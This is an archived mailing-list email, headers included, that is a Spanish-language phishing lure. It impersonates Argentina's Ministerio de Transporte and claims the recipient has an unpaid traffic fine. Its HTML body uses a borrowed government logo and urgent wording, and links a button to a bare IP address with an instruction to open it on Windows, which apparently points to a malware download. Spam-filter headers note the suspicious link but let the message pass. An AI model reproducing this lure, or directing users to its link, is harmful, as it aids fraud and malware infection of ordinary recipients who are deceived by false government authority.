Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 98F2956A252
	for <lists+industrypack-devel@lfdr.de>; Thu,  7 Jul 2022 14:50:44 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1o9Qxu-000843-TT
	for lists+industrypack-devel@lfdr.de; Thu, 07 Jul 2022 12:50:42 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <www-data@zen08.dynuddns.com>) id 1o9Qxu-00083s-5A
 for industrypack-devel@lists.sourceforge.net; Thu, 07 Jul 2022 12:50:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:Message-Id:From:Content-type:MIME-Version:
 Subject:To:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Tb15nPmLHZO9ZmjKwpLxQHOe29dDMZyUoX0bsE7wn7M=; b=RJaRu2ezhu2x7XOcmX6pXqpA+h
 /w7CP3KqIgf/f5OcnFEFxZBuacr294eW/IQxVLC6jTY9krmPH2pNLOAkvxDY1pHzEzJLtNsxcLgoG
 57XGN9AIAV5JXNHVRxrMWvLqRja28wSj+FN7Dd5CFHbrFpuUSdjt/a/y2EYuxk1EfAOI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:Message-Id:From:Content-type:MIME-Version:Subject:To:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Tb15nPmLHZO9ZmjKwpLxQHOe29dDMZyUoX0bsE7wn7M=; b=P
 Dl0XJeeLh/z04v3wyENYWd8QDRovk30MNCjtO1MFi0d183gIgUH9jEXdJTf5qS3NNmNeNIhNkTH1C
 c7PZ71W1TmExovrS+hz8wASU+71PigUUgKTs9kGpvvs+G+BGIZZ+ECSRwBQnZ0Gd99RAXmpI/BKiX
 JkpMFr/S2onjTh/Q=;
Received: from zen08.dynuddns.com ([5.8.33.95])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1o9Qxr-0002Rk-Nx
 for industrypack-devel@lists.sourceforge.net; Thu, 07 Jul 2022 12:50:41 +0000
Received: by zen08.dynuddns.com (Postfix, from userid 33)
 id 8A4A422D00; Thu,  7 Jul 2022 12:29:29 +0000 (UTC)
To: industrypack-devel@lists.sourceforge.net
MIME-Version: 1.0
From: Ministerio de Transporte <multa@argentina.gobs.ar>
Message-Id: <20220707122929.8A4A422D00@zen08.dynuddns.com>
Date: Thu,  7 Jul 2022 12:29:29 +0000 (UTC)
X-Spam-Score: 3.6 (+++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Multa Pendiente Saludos Cordiales Tienes una multa pendiente
 Se ha identificado en nuestro sistema una multa de trafico no pagada dirigida
 a usted o su vehiculo. 
 Content analysis details:   (3.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [5.8.33.95 listed in dnsbl-1.uceprotect.net]
 0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
 DNS
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
 mail domains are different
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 NUMERIC_HTTP_ADDR      URI: Uses a numeric IP address in URL
 0.0 NORMAL_HTTP_TO_IP      URI: URI host has a public dotted-decimal IPv4
 address
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 1.5 CONTENT_AFTER_HTML_WEAK More content after HTML close tag
X-Headers-End: 1o9Qxr-0002Rk-Nx
Subject: [Industrypack-devel] MULTA NO PAGADA - bloque de vehiculos - [ id
 96503908 ]
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6270900969273105892=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6270900969273105892==
Content-type: text/html; charset=iso-8859-1

<html lang="pt-br"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multa Pendiente</title>
    
        <style>body{margin:0;padding:0;overflow-x:auto !important;overflow-y:hidden !important}.mail-detail-content{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif;font-size:13px;font-weight:normal;font-feature-settings:"liga" 0;width:100%;position:relative;padding:0}.ios.smartphone .mail-detail-content{-webkit-overflow-scrolling:touch;overflow-x:auto}.smartphone .mail-detail-content{font-size:15px}.mail-detail-content>div>[class$="-content"]{padding:0}.mail-detail-content.plain-text{font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif;white-space:pre-wrap}.mail-detail-content.plain-text blockquote{white-space:normal}.mail-detail-content.fixed-width-font,.mail-detail-content.fixed-width-font.plain-text,.mail-detail-content.fixed-width-font blockquote,.mail-detail-content.fixed-width-font.plain-text blockquote,.mail-detail-content.fixed-width-font blockquote p,.mail-detail-content.fixe
 d-width-font.plain-text blockquote p{font-family:monospace;-webkit-font-feature-settings:normal;font-feature-settings:normal}.mail-detail-content.simple-mail{max-width:700px}.mail-detail-content.simple-mail.big-screen{max-width:100%}.mail-detail-content.simple-mail img{max-width:100%;height:auto!important}.mail-detail-content img[src=""]{background-color:rgba(0,0,0,0.1);background-image:repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(255,255,255,0.5) 20px, rgba(255,255,255,0.5) 40px)}.mail-detail-content p{font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif;margin:0 0 1em 0}.mail-detail-content h1{font-size:28px}.mail-detail-content h2{font-size:21px}.mail-detail-content h3{font-size:16.38px}.mail-detail-content h4{font-size:14px}.mail-detail-content h5{font-size:11.62px}.mail-detail-content h6{font-size:9.38px}.mail-detail-content a{word-break:break-word;text-decoration:none;color:inherit}.mail-detail-content a:hover{color:
 inherit}.mail-detail-content a[href]{color:#3c61aa;text-decoration:underline}.mail-detail-content th{padding:8px;text-align:center}.mail-detail-content th[align="left"]{text-align:left}.mail-detail-content .calendar-detail .label{display:block;text-shadow:none;font-weight:normal;background-color:transparent}.mail-detail-content img.emoji-softbank{margin:0 2px}.mail-detail-content pre{word-break:keep-all;word-break:initial;white-space:pre-wrap;background-color:transparent;border:0 none;border-radius:0}.mail-detail-content table{font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif;font-size:13px;font-weight:normal;font-feature-settings:"liga" 0;line-height:normal;border-collapse:collapse}.mail-detail-content ul,.mail-detail-content ol{padding:0;padding-left:16px;margin:1em 0 1em 24px}.mail-detail-content ul{list-style-type:disc}.mail-detail-content ul ul{list-style-type:circle}.mail-detail-content ul ul ul{list-style-type:square}.mail-detail-conten
 t li{line-height:normal;margin-bottom:0.5em}.mail-detail-content blockquote{color:#555;font-size:13px;border-left:2px solid #ddd;padding:0 0 0 16px;margin:16px 0 16px 0}.mail-detail-content blockquote p{font-size:13px}.mail-detail-content blockquote blockquote{border-color:#283f73;margin:8px 0}.mail-detail-content.colorQuoted blockquote blockquote{color:#283f73 !important;border-left:2px solid #283f73}.mail-detail-content.colorQuoted blockquote blockquote a[href]:not(.deep-link){color:#283f73}.mail-detail-content.colorQuoted blockquote blockquote a[href]:not(.deep-link):hover{color:#1b2a4d}.mail-detail-content.colorQuoted blockquote blockquote blockquote{color:#dd0880 !important;border-left:2px solid #dd0880}.mail-detail-content.colorQuoted blockquote blockquote blockquote a[href]:not(.deep-link){color:#dd0880}.mail-detail-content.colorQuoted blockquote blockquote blockquote a[href]:not(.deep-link):hover{color:#ac0663}.mail-detail-content.colorQuoted blockquote blockquote blockquote
  blockquote{color:#8f09c7 !important;border-left:2px solid #8f09c7}.mail-detail-content.colorQuoted blockquote blockquote blockquote blockquote a[href]:not(.deep-link){color:#8f09c7}.mail-detail-content.colorQuoted blockquote blockquote blockquote blockquote a[href]:not(.deep-link):hover{color:#6c0796}.mail-detail-content.colorQuoted blockquote blockquote blockquote blockquote blockquote{color:#767676 !important;border-left:2px solid #767676}.mail-detail-content.colorQuoted blockquote blockquote blockquote blockquote blockquote a[href]:not(.deep-link){color:#767676}.mail-detail-content.colorQuoted blockquote blockquote blockquote blockquote blockquote a[href]:not(.deep-link):hover{color:#5d5d5d}.mail-detail-content.disable-links a[href]{color:#aaa !important;text-decoration:line-through !important;cursor:default !important;pointer-events:none !important}.mail-detail-content .blockquote-toggle{color:#767676;font-size:13px;padding-left:56px;margin:16px 0;min-height:16px;word-break:bre
 ak-word}.mail-detail-content .blockquote-toggle button.bqt{color:#696969;background-color:#eee;padding:1px 10px;display:inline-block;font-size:14px;line-height:16px;cursor:pointer;outline:0;position:absolute;left:0;border:0}.mail-detail-content .blockquote-toggle button.bqt:hover,.mail-detail-content .blockquote-toggle button.bqt:focus{color:#fff;background-color:#3c61aa;text-decoration:none}.mail-detail-content .max-size-warning{color:#767676;padding:16px 16px 0 16px;border-top:1px solid #ddd}.mail-detail-content a.deep-link{color:white;background-color:#3c61aa;text-decoration:none;font-size:90%;font-weight:bold;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif !important;padding:0.10em 8px;border-radius:3px}.mail-detail-content a.deep-link:hover,.mail-detail-content a.deep-link:focus,.mail-detail-content a.deep-link:active{color:white;background-color:#2f4b84}@media print{.mail-detail-content .collapsed-blockquote{display:block !important}.m
 ail-detail-content .blockquote-toggle{display:none !important}}.mail-detail-content>div[id*="ox-"]>h1,.mail-detail-content>div[id*="ox-"]>h2,.mail-detail-content>div[id*="ox-"]>h3,.mail-detail-content>div[id*="ox-"]>h4,.mail-detail-content>div[id*="ox-"]>
		h5{margin-top:0}
		.cabeceraDGT .accesoMiDGT-login {
     	background-color: #004488;
   		border-radius: 6px;
   		padding: 0.4em;
   		text-align: center;
  		font-weight: bold;             
     	color: white;
     	white-space: nowrap;
    }
		</style>
     </head>

<body class="mail-detail-content noI18n colorQuoted">
    <div alt="centro" class="es-wrapper-color">
       <table width="100%" cellspacing="0" cellpadding="0" class="es-wrapper">
          <tbody>
             <tr>
                <td valign="top" class="esd-email-paddings">
                   <div style="text-align: center;"> 
                   </div>
                   <table cellspacing="0" cellpadding="0" align="center" class="esd-header-popover es-content">
                      <tbody>
                         <tr>
                            <td align="center" alt="table 01" class="esd-stripe">
                               <div style="text-align: center;"> 
                               </div>
                               <table width="600" cellspacing="0" cellpadding="0" align="center" class="es-content-body" style="background-color: transparent;">
                                  <tbody>
                                     <tr>
                                        <td align="left" class="esd-structure es-p5b es-p10r es-p10l">
                                           <br>
                                           <div class="flotar-izq" id="area-identidad" style="text-align: center;">
                                              <span style="color: red; font-weight: bold;"></span>
                                              <img alt="imagem 01" src="https://gba.gob.ar/imagenes/logo_gba_footer_blanco.svg" class="logo" id="logo1" style="width: 209px; height: 60px;">
                                              
                                           </div>
                                           <div alt="centro" class="flotar-izq" id="area-identidad" style="text-align: center;"> 
                                           </div>
                                           <table cellspacing="0" cellpadding="0" align="right" style="color: rgb(53, 104, 164); font-family: Arial;">
                                              <tbody>
                                                 <tr>
                                                    <td width="280" align="left" class="esd-container-frame">
                                                       <table width="100%" cellspacing="0" cellpadding="0">
                                                          <tbody>
                                                             <tr>
                                                                <td align="right" class="esd-block-text es-infoblock">&nbsp;</td>
                                                             </tr>
                                                          </tbody>
                                                       </table>
                                                    </td>
                                                 </tr>
                                              </tbody>
                                           </table>
                                        </td>
                                     </tr>
                                  </tbody>
                               </table>
                            </td>
                         </tr>
                       
                      </tbody>
                   </table>
                   <table cellspacing="0" cellpadding="0" alt="centro 001" align="center" class="es-content">
                      <tbody>
                         <tr>
                            <td align="center" alt="td" class="esd-stripe">
                               <table width="600" cellspacing="0" cellpadding="0" align="center" class="es-content-body">
                                  <tbody>
                                     <tr>
                                        <td bgcolor="#fff2cc" align="left" style="background-color: rgb(255, 242, 204);" class="esd-structure es-p20t es-p20b es-p20r es-p20l">
                                           <table width="100%" cellspacing="0" cellpadding="0">
                                              <tbody>
                                                 <tr>
                                                    <td width="560" valign="top" align="center" class="esd-container-frame">
                                                       <table width="100%" cellspacing="0" cellpadding="0" alt="new">
                                                          <tbody alt="meta new">
                                                             <tr>
                                                                <td align="center" class="esd-block-text es-p10l" style="background-color: white;">
                                                                   <span style="margin: 0px 0px 0px 24px; padding: 0px; color: #120a8f; font-size: 1.2em; font-weight: 700; text-transform: uppercase; font-family: OpenSans-Regular,sans-serif; font-style: normal; letter-spacing: normal; orphans: 2; text-align: justify; text-indent: 0px; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);" class="dgt-announcements-title">
                                                                    Saludos Cordiales</span>
                                                                   <span style="color: rgb(76, 83, 93); font-family: OpenSans-Regular,sans-serif; font-size: 12.6px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;">
                                                                  </span> <br class="Apple-interchange-newline"> <br> 
                                                                   <span style="color: red; font-weight: bold;"></span>                                                                   
                                                                   <span style="color:#FF0000; font-weight: bold;">&nbsp;&nbsp;&nbsp;
                                                                  <h2>
                                                                    Tienes una multa pendiente
                                                                  </h2>  
                                                                  </span>
                                                                   <span style="font-weight: bold;"></span>
                                                               
                                                                   <br style="color: rgb(0, 68, 136);"> 
                                                                   <span style="font-weight: bold; color: #add8e6;">Se ha identificado en nuestro sistema una multa de trafico no pagada<br>dirigida a usted o su vehiculo.<br></span><br style="font-weight: bold; color: rgb(0, 68, 136);"> <span style="font-weight: bold; color: black;"><span style="color:#add8e6;">Para ver la notificacion<br>Visite:</span> </span> 
                                                                   <hr>
																   
																   
                                                                   <p style="color: rgb(36, 36, 36); background-color:#ffffff;">
																   
												
																   
																   <a href="http://20.239.53.131/">
																   <img src="https://uploaddeimagens.com.br/images/003/852/135/original/Screenshot_8.png?1651536508" alt="acess" width="250" height="100">
																   </a>
																   <span style="color: red; font-weight: bold;"></span><br style="font-family: Arial;"> <span style="font-weight: bold;">Atencion:<br> Para ver la notificacion, abra en un sistema (Windows).</span><span style="color: red; font-family: Arial;"> </span><br style="font-family: Arial;"> <br style="font-family: Arial;"> 
																   
																   </p>
                                                                
																</td>
                                                             </tr>
                                                          </tbody>
                                                       </table>
                                                    </td>
                                                 </tr>
                                              </tbody>
                                           </table>
                                        </td>
                                     </tr>
                                  </tbody>
                               </table>
                            </td>
                         </tr>
                      </tbody>
                   </table>
                   <table cellspacing="0" alt="td 02" cellpadding="0" align="center" class="esd-footer-popover es-content">
                      <tbody>
                         <tr>
                            <td align="center" class="esd-stripe">
                               <table width="600" cellspacing="0" cellpadding="0" align="center" style="background-color: transparent;" class="es-content-body">
                                  <tbody>
                                     <tr>
                                        <td align="left" class="esd-structure es-p10t es-p10b es-p20r es-p20l">
                                           <table cellspacing="0" cellpadding="0" style="width: 596px; height: 35px;">
                                              <tbody>
                                                 <tr>
                                                    <td width="560" valign="top" align="center" class="esd-container-frame">
                                                       <p style="margin: 0px; padding: 0.5em 0px 0px; font-size: 10px; color: black; font-family: OpenSans-Regular,sans-serif; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color:#add8e6;" class="copyright-ft">Copyright © infraccionesba 2022. Todos los derechos reservados.</p>
                                                       <p style="margin: 0px 0px 10px; padding: 0.5em 0px 0px; font-style: italic; font-size: 10px; color: black; font-family: OpenSans-Regular,sans-serif; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color:#add8e6;" class="version-ft">Version V5.1.0.7<br> <br> </p>
                                                    </td>
                                                 </tr>
                                              </tbody>
                                           </table>
                                        </td>
                                     </tr>
                                  </tbody>
                               </table>
                            </td>
                         </tr>
                      </tbody>
                   </table>
                </td>
             </tr>
          </tbody>
       </table>
       <table alt="tb 02" width="600" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center" class="es-content-body">
          <tbody>
             <tr> 
             </tr>
          </tbody>
       </table>
    </div>
    
    <div style="text-align: center; color: rgb(53, 104, 164);">
       <span style="font-weight: bold;"></span>
    </div>



</body></html>07/07/2022 12:29:29


--===============6270900969273105892==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6270900969273105892==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6270900969273105892==--
